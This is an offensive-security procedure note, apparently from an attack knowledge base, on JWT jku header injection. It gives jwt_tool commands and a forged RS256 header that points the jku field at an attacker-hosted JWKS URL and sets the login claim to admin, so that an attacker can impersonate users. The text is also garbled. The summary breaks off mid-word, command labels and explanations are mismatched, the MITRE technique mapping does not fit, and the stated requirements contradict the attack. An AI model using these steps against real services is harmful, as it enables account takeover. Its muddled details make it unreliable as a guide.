---
id: 8191dfc3-1292-4219-b032-c2a6c8684684
name: JWT Token Signing with JWKS Injection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:00.849385+00:00'
updated_at: '2023-04-10T20:22:36.324305+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Modify Authentication Process|T1556 - Modify Authentication Process]]'
sub_techniques:
- '[[Password Filter DLL|T1556.002 - Password Filter DLL]]'
tags:
- '[[JWKS - jku header injection]]'
- '[[JWT Claims]]'
- '[[JWT - JSON Web Token]]'
commands:
- '[[Add login information to JWT]]'
- '[[Decode JWT]]'
- '[[Sign JWT with new private key and export public key]]'
- '[[Sign JWT with RS256 algorithm]]'
- '[[Verify JWT signature with JWKS endpoint]]'
---

# JWT Token Signing with JWKS Injection

## Summary

This procedure involves signing a JWT token with a private key and injecting a malicious jku header using a JSON Web Key Set (JWKS) endpoint. The jku header is used to specify the URL of the JWKS endpoint that contains the public key used to verify the signature of the JWT token. By manipulating th

## Description

# Description

This procedure involves signing a JWT token with a private key and injecting a malicious jku header using a JSON Web Key Set (JWKS) endpoint. The jku header is used to specify the URL of the JWKS endpoint that contains the public key used to verify the signature of the JWT token. By manipulating the jku header, an attacker can cause the JWT token to be verified with a public key controlled by the attacker, allowing them to forge and impersonate legitimate users.

This technique can be used by an attacker to gain access to sensitive information or systems by impersonating a legitimate user.

## Requirements

1. Access to a JWKS endpoint

1. Knowledge of the private key used to sign the JWT token

## Defense

1. Implement proper input validation and sanitization to prevent injection attacks.

1. Use secure communication channels (e.g. HTTPS) to protect against man-in-the-middle attacks.

1. Implement proper access controls and authentication mechanisms to prevent unauthorized access to the JWKS endpoint.

## Objectives

1. Gain access to sensitive information or systems by impersonating a legitimate user.

# Instructions

1. Replace JWT_HERE with the JWT token you want to sign.

**Code**: [[python3 jwt_tool.py JWT_HERE -X s
python3 jwt_tool]]

> This command signs the JWT token with a private key and injects a malicious jku header pointing to the attacker's JWKS endpoint.

**Command** ([[Decode JWT]]):

```bash
python3 jwt_tool.py JWT_HERE -X s
```

**Command** ([[Verify JWT signature with JWKS endpoint]]):

```bash
python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
```

2. 

**Code**: [[{"typ":"JWT","alg":"RS256", "jku":"https://example]]

> This command deconstructs a JWT token into its header and payload, showing the jku header and the claims included in the token.

**Command** ([[Sign JWT with RS256 algorithm]]):

```bash
{"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json", "kid":"id_of_jwks"}
```

**Command** ([[Add login information to JWT]]):

```bash
{"login":"admin"}
```

**Command** ([[Sign JWT with new private key and export public key]]):

```bash
[Signed with new Private key; Public key exported]
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Modify Authentication Process|T1556 - Modify Authentication Process]]

### Sub-Techniques

- [[Password Filter DLL|T1556.002 - Password Filter DLL]]

## Commands Used

- [[Add login information to JWT]]
- [[Decode JWT]]
- [[Sign JWT with new private key and export public key]]
- [[Sign JWT with RS256 algorithm]]
- [[Verify JWT signature with JWKS endpoint]]

## Tags

- [[JWKS - jku header injection]]
- [[JWT Claims]]
- [[JWT - JSON Web Token]]
